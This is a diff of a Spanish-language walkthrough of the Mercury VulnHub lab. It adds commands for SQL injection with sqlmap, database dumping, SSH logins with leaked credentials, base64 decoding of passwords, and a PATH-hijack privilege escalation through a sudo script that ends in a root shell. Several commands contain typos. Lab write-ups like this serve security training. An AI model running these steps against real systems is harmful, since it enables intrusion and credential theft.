@@ -49,7 +49,9 @@ De lo que vemos en la web, lo más interesante son los 3 puntos que aparecen. Y 
 <br><br>
 Y llegamos a lo que aprece ser una web en desarrollo con 2 enlaces. El primero te lleva a datos sobre Mercurio, que puedes ir cambiando si cambias el número de la URL. Hay hasta 8 datos. El segundo enlace es una lista de cosas que hacer para la web. <br>
 El siguiente paso será usar una herramienta llamada SQLmap, para que liste bbdd.<br><br>
-
+```
+sqlmap -u http.//10.0.2.5:8080/mercuryfacts/ --dbs --batch
+```
 ![Imagen2](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/78754d50-e547-4a22-a04c-b489aba5320e)
 <br><br>
 
@@ -65,12 +67,15 @@ sqlmap -u http.//10.0.2.5:8080/mercuryfacts/ -D mercury --dump-all --batch
 ![Imagen4](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/a2bc1efa-acff-4bfa-b168-e24555a23e5b)
 <br><br>
 
-Y hemos obtenido una lista de usuarios con sus respectivas contraseñas. Sabiendo que el puerto 22, correspondiente a ssh, está abierto, vamos a intentar explotar esta vulnerabilidad probando cada usuario y contraseña. <br><br>
+Y hemos obtenido una lista de usuarios con sus respectivas contraseñas. Sabiendo que el puerto 22, correspondiente a ssh, está abierto, vamos a intentar explotar esta vulnerabilidad. Tras empezar a probar con cada usuario y contraseña, hemos tenido éxito con el usuario webmaster. <br><br>
+```
+ssh webmaster@10.0.2.5
+```
 
 ![Imagen5](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/9c681734-201f-43dc-9d72-ecabcfb608dd)
 <br><br>
 
-Finalmente, nos ha permitido acceder con el usuario webmaster. <br><br>
+Como vemos, tenemos acceso con el usuario webmaster. <br><br>
 
 ![Imagen6](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/d0979e8d-b046-444a-be3f-3c99fbb649f4)
 <br><br>
@@ -96,17 +101,25 @@ Veamos qué contiene el archivo notes.txt. <br><br>
 ![Imagen10](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/6c6e1cb2-4c8c-4a3e-bec8-6b1e1d268379)
 <br><br>
 Parece que son 2 cadenas de caracteres codificados, seguramente en base 64. Vamos a intentar traducirlos. <br><br> 
+```
+echo "bWVyY3VyewlzdGhlc2l6ZW9MC4wNTZFYXJ0aHMK" | base64 -d mercuryisthesizeof0.056Earths
+```
 
 ![Imagen11](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/64bc5d5e-3a73-46fb-bedf-c8d108845b54)
 <br><br>
 
 Tras decodificarla podemos comprobar que era la contraseña para el usuario webmaster. Lo que nos indica que probablemente la otra sea la contraseña del linuxmaster. Decodifiquémosla entonces: <br><br>
+```
+echo "bWVyYзVyew1lYW5kaWFtZXRlcmlzNDg4MGttCg= base64 -d mercurymeandiameteris4880km
+```
 
 ![Imagen12](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/9d2d07cd-649c-4f1a-8b16-b11cdb578b49)
 <br><br>
 
 Efectivamente, obtenemos la contraseña de linuxmaster. A continuación, entraremos con estas credenciales. <br><br>
-
+```
+ssh linuxmaster@10.0.2.5
+```
 ![Imagen13](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/640c4874-100a-4e88-9bc9-ea340c384aec)
 <br><br>
 
@@ -116,9 +129,25 @@ Comprobamos qué derechos y privilegios tiene este usuario: <br><br>
 <br><br>
 
 Parece ser que tiene privilegios de root sobre /usr/bin/check_syslog.sh. Realizaremos a continuación una escalada de privilegios para obtener acceso como root. <br><br>
+```
+cat /usr/bin/check_syslog.sh
+```
+```
+tail -n 10 /var/log/syslog
+```
+```
+ln -s /usr/bin/vi tail
+```
+```
+export PATH=$(pwd):$PATH
+```
+```
+sudo --preserve-env=PATH /usr(bin/check_syslog.sh
+```
 
 ![Imagen15](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/d097a58d-c8f4-47a4-b94b-2d34d11f1741)
 <br><br>
+
 A continuación escribiríamos lo siguiente: <br>
 ```
 :!/bin/bash
